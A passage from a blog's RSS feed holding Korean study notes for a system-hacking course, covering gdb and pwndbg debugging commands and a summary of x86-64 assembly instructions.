        <link>http://localhost:4000/blog/dreamhack_system_hacking/step3-2</link>
        <guid isPermaLink="true">http://localhost:4000/blog/dreamhack_system_hacking/step3-2</guid>
      </item>
    
      <item>
        <title>System Hackig Step 3-1</title>
        <description>&lt;h1 id=&quot;stage-3-1&quot;&gt;STAGE 3-1&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;gdb 설치와 pwndbg 플러그인 설치하기.&lt;/li&gt;
  &lt;li&gt;만일 뭔가 잘못해서 aslr 커맨드의 화이트리스트로~ 라는 경고문이 나온다면, 그건 여러 gdb 플러그인을 설치했기 때문에 .gdbinit 파일이 중복돼서 생기는 문제이므로 ~/.gdbinit 파일을 깨끗하게 지우고 설치했던 플러그인 폴더들을 다 지운 후 gdb가 여전히 남아 있는지 확인 한 번 해보고 다시 플러그인을 설치하는 것을 추천한다. 설치할 때의 instruction을 잘 따르자.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;gdb-사용하기-기초&quot;&gt;gdb 사용하기 기초&lt;/h1&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;gdb는 리눅스의 대표적인 디버거&lt;/li&gt;
  &lt;li&gt;무료로 설치할 수 있고, 수많은 유용한 플러그인을 결합해 사용할 수 있음.&lt;/li&gt;
  &lt;li&gt;다양한 명령어가 존재하며, 적재적소에 명령어를 사용할 때 그 진가를 발휘할 수 있음.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;prolog&quot;&gt;Prolog&lt;/h2&gt;

&lt;p&gt;리눅스의 실행파일은 .elf이다. 이런 elf 파일의 정보를 읽어오기 위해 리눅스에서 기본으로 제공하고 있는 명령어가 있는데, 그것은 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readelf&lt;/code&gt; 이다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readelf -h {file path}&lt;/code&gt; 를 실행해 대상 실행 파일의 헤더 정보를 읽어온 결과는 아래와 같이 표시된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled.jpeg&quot; alt=&quot;readelf로 elf 파일의 헤더 정보를 읽어온 결과&quot; /&gt;&lt;/p&gt;

&lt;p&gt;readelf로 elf 파일의 헤더 정보를 읽어온 결과&lt;/p&gt;

&lt;p&gt;이를 이용해 대상 파일의 EP, 즉 entry point를 알 수 있다. &lt;strong&gt;리버싱할 때 제일 중요한 게 바로 이 EP를 찾는 것&lt;/strong&gt;인데, 리눅스 환경에서 ELF 파일은 손쉽게 EP를 알 수 있으므로 스타트는 쉽게 끊을 수 있다.&lt;/p&gt;

&lt;p&gt;다만 ASLR 이라고 리눅스 자체 메모리 보호 기법이 있는데, 힙이나 스택 등 어떤 프로세스를 실행할 때마다 그 프로세스에게 할당되는 가상 메모리의 주소가 전부 달라지는 기능이 있다. ASLR이 설정되어 있다면 디버깅할 때마다 모든 주소가 달라지는 진기명기를 확인할 수 있으니, ASLR을 꺼두는 것을 추천한다.&lt;/p&gt;

&lt;p&gt;ASLR이 함수의 EP에도 영향을 주는지는 내가 방금 ASLR을 끄고 디버깅해서 확인했다. 진짜로 끄는 것을 강력 추천한다.&lt;/p&gt;

&lt;p&gt;ASLR을 해제하기 위해서는 아래의 명령어를 터미널에 입력하면 된다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo sysctl -w kernel.randomize_va_space=0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;해당 elf 파일의 헤더 정보를 알아냈다면, 드디어 gdb를 이용해 실행 파일을 분석해 볼 시간이다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb {file_path}&lt;/code&gt; 를 실행해 gdb를 해당 파일에 붙인다.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;start&lt;/code&gt; 명령어를 입력한다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%201.jpeg&quot; alt=&quot;start 명령어를 실행한 결과.&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;start 명령어를 실행한 결과.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;gdb의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;start&lt;/code&gt; 명령어는 EP부터 프로그램을 분석할 수 있게 해준다.&lt;/li&gt;
      &lt;li&gt;현재 rip의 값은 DISASM 섹션의 화살표가 가리키고 있는 주소이다.
        &lt;ul&gt;
          &lt;li&gt;이 경우 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x555555555149&lt;/code&gt; 임을 확인할 수 있다.&lt;/li&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1149&lt;/code&gt; 에 BP가 걸린 걸 보니 이 프로세스의 EP는 오프셋 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1149&lt;/code&gt; 일 것이다.&lt;/li&gt;
          &lt;li&gt;
            &lt;p&gt;아니 앞에서는 EP 주소가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1060&lt;/code&gt; 인데 왜 main의 엔트리는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1149&lt;/code&gt; 인 거야???&lt;/p&gt;

            &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%202.jpeg&quot; alt=&quot;이해가 안 돼서 main의 엔트리와 원래 엔트리로 예상되는 주소의 데이터를 체크해 보았다.&quot; /&gt;&lt;/p&gt;

            &lt;p&gt;이해가 안 돼서 main의 엔트리와 원래 엔트리로 예상되는 주소의 데이터를 체크해 보았다.&lt;/p&gt;

            &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_start&lt;/code&gt; 함수는 컴파일할 때 자동으로 따라와 붙는 함수인데, 해당 함수의 끝 부분에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__libc_start_main&lt;/code&gt; 이라는 dll을 호출한다. 해당 dll에서 연쇄적인 호출 과정을 거쳐서 내가 만든 프로세스의 진짜 엔트리인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; 이 호출되기 때문이 이와 같은 불일치 현상이 일어나는 것이다.&lt;/p&gt;

            &lt;p&gt;한 마디로 elf 파일의 엔트리는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_start&lt;/code&gt; 함수부터라고 인식하지만, gdb를 붙여서 돌렸을 때 gdb는 쓸데없는 dll 실행은 넘겨 버리고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; 에 BP를 만들기 때문에 발생하는 현상이다. &lt;del&gt;gdb가 너무 똑똑해서 생긴 문제였다…!&lt;/del&gt;&lt;/p&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;context-pwndbg의-대시보드&quot;&gt;Context: pwndbg의 대시보드&lt;/h2&gt;

&lt;p&gt;사실 Context라는 말은 프로세스 관련해서 많이 쓰이는 말이다. pwndbg는 이런 context의 특성을 차용해 &lt;strong&gt;프로세스 실행 시 주요 메모리들의 실시간 상태를 보여주는&lt;/strong&gt; 자신의 대시보드를 &lt;strong&gt;Context&lt;/strong&gt;라고 칭하고 있다.&lt;/p&gt;

&lt;p&gt;pwndbg의 context는 크게 4개의 영역으로 구분된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Registers: 레지스터의 상태를 보여준다. 레지스터의 종류가 뭐였지? 라는 의문이 든다면 &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step2/#/&quot;&gt;System Hacking Step2: Computer Architecture&lt;/a&gt; 참고.&lt;/li&gt;
  &lt;li&gt;Disasm: rip부터 시작해서 여러 줄에 걸쳐 디스어셈블된 결과를 보여주는 섹션이다. 즉, 앞으로 실행될 인스트럭션들을 어셈블리어로 보여주는 섹션이다.&lt;/li&gt;
  &lt;li&gt;Stack: rsp부터 여러 줄에 걸쳐 스택의 값들을 보여준다. 스택의 맨 위부터 뭐가 있는지(스택에 뭐가 들어있는지 가장 최신의 것부터)를 어느 정도 보여준다는 뜻이다.&lt;/li&gt;
  &lt;li&gt;Backtrace: 현재 rip에 도달할 때까지 어떤 함수들이 중첩되어 호출됐는지 보여준다. 화살표가 있는 부분이 현재 rip가 있는 함수이고, 그 밑에 있는 것들이 이제까지 호출됐던 함수 목록이다. 보통 이러면 콜스택 보여주지 않나? 왜 굳이 이미 지나가서 기능이 끝난 함수들을 보여주려 하지?&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;breakcontinue&quot;&gt;break&amp;amp;continue&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;gdb를 이용해 프로그램을 분석할 땐, 프로그램의 동작 중 아주 일부분에만 관심이 있을 때이다.&lt;/li&gt;
  &lt;li&gt;이러한 목적 달성을 위해 break와 continue라는 기능이 있다.
    &lt;ul&gt;
      &lt;li&gt;break: 특정 주소에 중단점(breakpoint)를 설정하는 기능&lt;/li&gt;
      &lt;li&gt;continue: 현재 지점에서 다음 중단점까지 멈춤 없이 실행하는 기능&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;run&quot;&gt;run&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;프로그램을 단순히 실행만 시키는 명령어.&lt;/li&gt;
  &lt;li&gt;중단점에서 멈추지만, &lt;strong&gt;프로그램을 처음부터 시작한다-중단점이 있으면 멈춘다&lt;/strong&gt;의 시퀀스이므로 &lt;strong&gt;중단점에서 시작한다-다음 중단점에서 멈춘다&lt;/strong&gt;의 시퀀스를 가진 &lt;strong&gt;continue와는 확연한 차이점&lt;/strong&gt;이 있다.&lt;/li&gt;
&lt;/ul&gt;

&lt;aside&gt;
⚙ gdb는 명령어 줄여쓰기 기능을 제공하기 때문에, 명령어를 특정할 수 있는 최소한의 문자열만 입력하면 자동으로 명령어를 찾아서 수행해 준다. 예를 들어서, 앞서 설명한 break는 b만 쳐도 되고, continue의 경우에는 c만 쳐도 된다. run 또한 r만 쳐도 자동으로 실행된다.

&lt;/aside&gt;

&lt;h2 id=&quot;disassembly&quot;&gt;disassembly&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;gdb에서 기본으로 제공하는 디스어셈블 명령어.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;함수 이름을 인자로 전달하면 해당 함수가 리턴될 때까지 전부 디스어셈블해 보여준다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;pwndbg에서는 &lt;strong&gt;u, nearpc, pdisassemble&lt;/strong&gt;을 제공한다. 디스어셈블된 코드를 가독성 좋게 출력해준다는 점에서 쓸 만하다!&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%205.jpeg&quot; alt=&quot;확실히 낫다.&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;확실히 낫다.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;navigate-ni-si-finish&quot;&gt;navigate: ni, si, finish&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;명령어를 한 줄씩 자세히 분석하는 기능.
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;ni(next instruction)&lt;/strong&gt;: 어셈블리 명령어를 딱 한 줄 실행한다. &lt;strong&gt;서브루틴의 내부로 들어가지 않는다.&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;si(step into)&lt;/strong&gt;: 어셈블리 명령어를 딱 한 줄 실행한다. &lt;strong&gt;서브루틴의 내부로 들어간다.&lt;/strong&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;strong&gt;finish&lt;/strong&gt;: 함수 규모가 너무 커서 ni로는 도무지 원래 함수로 돌아올 수 없는 경우, 현재 위치한 함수의 맨 끝까지 한번에 실행할 수 있는 명령어.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;서브루틴이란?
    &lt;ul&gt;
      &lt;li&gt;함수 내부에서 다른 함수를 콜할 때, 그 다른 함수의 실행 루틴을 서브루틴이라고 한다.&lt;/li&gt;
      &lt;li&gt;즉 서브루틴의 내부=현재 함수에서 콜한 다른 함수의 내부&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;examine-x&quot;&gt;examine: x&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;가상 메모리에 존재하는 임의 주소의 값을 관찰해야 할 때 사용한다.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;x&lt;/strong&gt;: &lt;strong&gt;원하는 주소&lt;/strong&gt;에서, &lt;strong&gt;원하는 길이&lt;/strong&gt;만큼의 데이터를 &lt;strong&gt;원하는 형식으로 인코딩&lt;/strong&gt;해 확인할 수 있다.
    &lt;ul&gt;
      &lt;li&gt;형식: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x/{원하는 데이터 묶음 수}{한 데이터 묶음의 길이}{데이터 형식}  {메모리 주소}&lt;/code&gt;
        &lt;ul&gt;
          &lt;li&gt;한 데이터 묶음의 길이(size): b(byte), h(halfword), w(word), g(giant; 8 bytes)&lt;/li&gt;
          &lt;li&gt;데이터의 형식(format): o(octal), x(hex), d(decimal), u(unsigned decimal), t(binary), f(float), a(address), i(instruction), c(char), s(string), z(hex, zero padded on the left)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;telescope&quot;&gt;telescope&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;pwndbg가 제공하는 메모리 덤프 기능. 메모리가 참조하고 있는 주소를 재귀적으로 탐색해 값을 보여주기까지 함!&lt;/li&gt;
  &lt;li&gt;현재 보이는 이 값이 어떤 주소에서 어떻게 사용되는지까지 알 수 있으므로 굉장히 유용하다.
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;rsp 기준으로 8개의 메모리 주소를 보여주기 때문에 콜스택의 역사를 알 수 있다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;vmmap&quot;&gt;vmmap&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;가상 메모리의 레이아웃을 보여주며, 어떤 파일이 매핑된 영역일 때 해당 파일의 경로까지 보여줌.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;cat /proc/{pid}/maps와 동일한 일을 한다. 물론 가독성은 훨씬 좋다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%207.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;aside&gt;
⚙ 파일 매핑:

- 어떤 파일을 메모리에 적재하는 것.
- 리눅스에서 ELF를 실행할 때의 과정:
    1. ELF 자체의 코드, 데이터 등을 가상 메모리에 매핑 
    2. 해당 ELF에 링크된 공유 오브젝트(.so)를 추가로 메모리에 매핑
        - 리눅스의 so = 윈도우의 dll
    3. so에 구현된 함수를 호출할 땐 매핑된 메모리에 존재하는 함수를 대신 호출(메모리에 적재된 so 내부의 함수를 호출)
&lt;/aside&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;gdbpython&quot;&gt;gdb/python&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;gdb를 이용해 디버깅 시, 숫자/알파벳 이외의 값은 입력값으로 직접 입력해줄 수 없는 문제가 있다.&lt;/li&gt;
  &lt;li&gt;첫번째 방식: python argv
    &lt;ul&gt;
      &lt;li&gt;목표 프로그램에 gdb를 붙이고 r 명령어의 인자로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$({원하는 내용을 줄 수 있는 파이썬 코드})&lt;/code&gt; 를 입력하면 프로그램의 &lt;strong&gt;‘인자’&lt;/strong&gt;를 전달할 수 있다.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;사용예:&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%208.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;두번째 방식: python input
    &lt;ul&gt;
      &lt;li&gt;목표 프로그램에 gdb를 붙이고, r 명령어의 인자로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&amp;lt;&amp;lt; $({파이썬 코드})&lt;/code&gt; 를 입력하면 프로그램 실행 중에 받는 &lt;strong&gt;‘입력값’&lt;/strong&gt;을 미리 전달할 수 있다.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;사용예: *(해당 프로그램은 인자와 입력값 모두를 요구하기 때문에 첫번째 방식과 두번째 방식이 함께 쓰였다.)&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;그-외-자주-사용되는-명령어들과-그-단축키&quot;&gt;그 외 자주 사용되는 명령어들과, 그 단축키&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;b: break&lt;/li&gt;
  &lt;li&gt;c: continue&lt;/li&gt;
  &lt;li&gt;r: run&lt;/li&gt;
  &lt;li&gt;si: step into
    &lt;ul&gt;
      &lt;li&gt;어떤 함수 안으로 들어가는 것이다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ni: next instruction
    &lt;ul&gt;
      &lt;li&gt;명령어를 딱 한 줄 더 실행하는 것이다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;i: info
    &lt;ul&gt;
      &lt;li&gt;접두어로 주로 사용되고, 접미로 붙는 요소의 정보를 확인하는 데 사용된다.&lt;/li&gt;
      &lt;li&gt;예시: info b (현재 브레이크 포인트 보기)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;k: kill
    &lt;ul&gt;
      &lt;li&gt;kill process&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;pd: pdisas
    &lt;ul&gt;
      &lt;li&gt;기존 gdb 명령어의 peda 버전으로, disas의 확장판이다.&lt;/li&gt;
      &lt;li&gt;화면이 좀 더 예쁘게, 가독성 좋게 나온다. &lt;del&gt;기부니가 조크든요&lt;/del&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

</description>
        <pubDate>Sun, 10 Jul 2022 21:10:23 +0900</pubDate>
        <link>http://localhost:4000/blog/dreamhack_system_hacking/step3-1</link>
        <guid isPermaLink="true">http://localhost:4000/blog/dreamhack_system_hacking/step3-1</guid>
      </item>
    
      <item>
        <title>System Hackig Step 2-2</title>
        <description>&lt;h1 id=&quot;stage-2&quot;&gt;STAGE 2&lt;/h1&gt;

&lt;h1 id=&quot;x86-assembly-part-1&quot;&gt;x86 Assembly: Part 1&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;리버싱 공부하면서 이미 했던 거라 여기에서는 간단하게 메모만 하고 넘어갑니다.&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;어셈블리어 → (by 어셈블러) → 기계어&lt;/li&gt;
  &lt;li&gt;역어셈블러 ↔  어셈블러
    &lt;ul&gt;
      &lt;li&gt;즉, 역어셈블러는 기계어 → 어셈블리어. 우리가 리버싱 할 때 없으면 안되는 것!&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;어셈블리어와-x86-64&quot;&gt;어셈블리어와 x86-64&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;요약&gt;

- CPU의 ISA(Instruction Set Architecture) 종류별로 어셈블리어가 다르다.
- 여기에서 다룰 어셈블리어는 x64 어셈블리어.
&lt;/요약&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;어셈블리어의-기본-구조&quot;&gt;어셈블리어의 기본 구조&lt;/h3&gt;

&lt;aside&gt;
💡 OpCode    Operand1, Operand2

&lt;/aside&gt;

&lt;p&gt;ex) &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov   eax, 3&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;어셈블리-명령어--중-알아두면-좋을-것&quot;&gt;어셈블리 명령어  중 알아두면 좋을 것&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;명령 코드&lt;/th&gt;
      &lt;th&gt; &lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Data Transfer&lt;/td&gt;
      &lt;td&gt;mov, lea&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Arithmetic&lt;/td&gt;
      &lt;td&gt;inc, dec, add, sub&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Logical&lt;/td&gt;
      &lt;td&gt;and, or, xor, not&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Comparison&lt;/td&gt;
      &lt;td&gt;cmp, test&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Branch&lt;/td&gt;
      &lt;td&gt;jmp, je, jg&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Stack&lt;/td&gt;
      &lt;td&gt;push, pop&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Procedure&lt;/td&gt;
      &lt;td&gt;call, ret, leave&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;System call&lt;/td&gt;
      &lt;td&gt;syscall&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;어셈블리-명령어의-피연산자&quot;&gt;어셈블리 명령어의 피연산자&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;“총 3가지 종류”&lt;/strong&gt;&lt;/p&gt;

  &lt;ol&gt;
    &lt;li&gt;상수(Immediate Value): {immediate_value}&lt;/li&gt;
    &lt;li&gt;레지스터(Register): {register_name}&lt;/li&gt;
    &lt;li&gt;메모리(Memory): &lt;strong&gt;[{memory_address}] …&lt;/strong&gt; &lt;em&gt;몰랐음!!&lt;/em&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;strong&gt;앞에 크기 지정자(Size Directive)인 TYPE PTR 추가될 수 있다.&lt;/strong&gt;&lt;/li&gt;
        &lt;li&gt;BYTE(1 byte), WORD(2 byte), DWORD(4 byte), QWORD(8 byte)
          &lt;ul&gt;
            &lt;li&gt;WORD가 2 byte인 이유: 맨 처음 인텔의 아키텍처가 16비트였는데, 나중에 아키텍처 확장 과정을 거치다 보니 WORD 자료형 크기를 변경해 버리면 다른 아키텍처에서 프로그램 호환이 안 되는 문제가 생겨서 그냥 16비트 유지.&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;x86-64-어셈블리-명령어&quot;&gt;x86-64 어셈블리 명령어&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;리버싱과 시스템 해킹의 원리에서 공부했던 내용이므로 간략히 정리하고 넘어감.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;데이터-이동-명령어&quot;&gt;데이터 이동 명령어&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;mov dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;src의 값을 dst에 이동.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;lea dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;src의 &lt;strong&gt;유효 주소&lt;/strong&gt;를 dst에 저장.&lt;/li&gt;
    &lt;li&gt;즉, src는 memory 타입의 피연산자로 오게 된다.
      &lt;ul&gt;
        &lt;li&gt;ex) lea rsi, [rbx+8&lt;em&gt;rcx]: rbx+8&lt;/em&gt;rcx를 rsi에 대입한다.&lt;/li&gt;
        &lt;li&gt;많이 헷갈리니까 주의!!!&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;산술-연산-명령어&quot;&gt;산술 연산 명령어&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;add dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;dst+=src&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;sub dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;dst-=src&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;inc op&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;op ++&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;dec op&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;op –&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;논리-연산-명령어&quot;&gt;논리 연산 명령어&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;and&lt;/strong&gt; dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;dst&amp;amp;=src&lt;/li&gt;
    &lt;li&gt;&lt;strong&gt;마스킹&lt;/strong&gt; 연산
      &lt;ul&gt;
        &lt;li&gt;eax=0xffff, ebx=0xcafe일 때, and eax, ebx를 시행하면 eax=0xcafe&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;or&lt;/strong&gt; dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;
      &lt;table&gt;
        &lt;tbody&gt;
          &lt;tr&gt;
            &lt;td&gt;dst&lt;/td&gt;
            &lt;td&gt;=src&lt;/td&gt;
          &lt;/tr&gt;
        &lt;/tbody&gt;
      &lt;/table&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;strong&gt;역 마스킹&lt;/strong&gt; 연산
      &lt;ul&gt;
        &lt;li&gt;eax=0xffff0000, ebx=0xdeadbeef일 때, or eax, ebx를 시행하면 eax=0xffffbeef&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;xor dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;dst^=src&lt;/li&gt;
    &lt;li&gt;비트가 다르면 1, 같으면 0&lt;/li&gt;
    &lt;li&gt;따라서, xor 연산을 동일한 값으로 두 번 실행할 경우, 원래 값으로 돌아감.
      &lt;ul&gt;
        &lt;li&gt;ex) rax=0x35014541, rbx=0xdeadbeef일 때,
          &lt;ul&gt;
            &lt;li&gt;xor rax, rbx 시행 후 rax=0xebacfbae&lt;/li&gt;
            &lt;li&gt;또 다시 xor rax, rbx 시행하면 rax=0x35014541&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
        &lt;li&gt;이런 성질을 이용해 XOR cipher가 개발(블록 암호화에서도 XOR의 성질을 이용해서 암호화하는 방식이 많은 것으로 기억함!)&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;not op&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;~(op) 즉, op의 비트 전부 반전(1의 보수)&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;xor rax, rbx
xor rax, rbx
not eax
